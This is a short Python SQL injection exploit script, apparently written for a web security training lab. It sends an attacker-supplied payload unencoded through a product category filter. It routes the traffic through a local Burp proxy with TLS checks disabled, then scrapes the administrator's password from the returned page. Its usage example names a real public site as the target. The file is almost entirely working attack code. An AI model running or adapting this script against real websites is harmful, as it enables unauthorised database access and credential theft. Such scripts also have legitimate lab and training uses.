import sys

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()

# let the script go through the burp suite proxy
# for debuging purposes
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli(base_url, payload_entered):
    uri = f"filter?category=Gifts'{payload_entered}"
    # in this way the payload_enetered is not encoded
    r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
    res = r.text
    if "administrator" in res:
        soup = BeautifulSoup(res, "html.parser")
        if soup.body:
            admin_element = soup.body.find(string="administrator")
            if admin_element:
                try:
                    admin_pswd = admin_element.find_next(name="td").text
                    print(f"[+] Password: {admin_pswd}")
                except AttributeError:
                    print("[-] Password not found or HTML structure unexpected")
            else:
                print("[-] 'administrator' text not found")
        else:
            print("[-] No 'body' element in the HTML")
    else:
        print("[-] 'administrator' text not found in the response")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
        sys.exit(-1)

    exploit_sqli(url, payload)
